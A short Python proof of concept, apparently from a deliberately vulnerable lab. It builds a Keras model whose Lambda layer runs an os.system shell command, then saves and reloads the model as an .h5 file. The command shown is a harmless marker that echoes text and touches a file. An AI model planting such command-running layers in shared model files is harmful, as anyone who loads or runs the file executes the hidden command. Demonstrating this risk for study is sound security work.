import tensorflow as tf
import os

@tf.keras.utils.register_keras_serializable()
def malicious_payload(x):
    os.system("echo 'pwned tensorflow' && touch haxor_tensorflow.txt")
    return x

class MaliciousPayload:
    def __init__(self):
        self.model = tf.keras.Sequential([
            tf.keras.layers.Input(shape=(64,)),
            tf.keras.layers.Lambda(malicious_payload)  # Use the registered function
        ])
        self.model.compile()
    
    def save(self):
        self.model.save('damn_vuln_tf_model.h5')
    
    @staticmethod
    def load():
        return tf.keras.models.load_model('damn_vuln_tf_model.h5', custom_objects={'malicious_payload': malicious_payload})

payload = MaliciousPayload()
payload.save()

loaded_model = MaliciousPayload.load()